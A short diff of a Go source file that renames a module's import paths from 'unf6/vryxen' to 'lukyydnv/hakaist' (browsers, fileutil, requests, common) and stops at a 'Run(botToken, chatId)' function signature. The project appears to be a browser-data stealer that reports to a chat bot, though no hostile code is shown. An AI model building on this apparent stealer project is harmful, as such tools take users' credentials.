@@ -5,10 +5,10 @@ import (
 	"os"
 	"strings"
 
-	"github.com/unf6/vryxen/internal/core/browsers"
-	"github.com/unf6/vryxen/pkg/utils/fileutil"
-	"github.com/unf6/vryxen/pkg/utils/requests"
-	"github.com/unf6/vryxen/pkg/utils/common"
+	"github.com/lukyydnv/hakaist/internal/core/browsers"
+	"github.com/lukyydnv/hakaist/pkg/utils/common"
+	"github.com/lukyydnv/hakaist/pkg/utils/fileutil"
+	"github.com/lukyydnv/hakaist/pkg/utils/requests"
 )
 
 func Run(botToken, chatId string) {
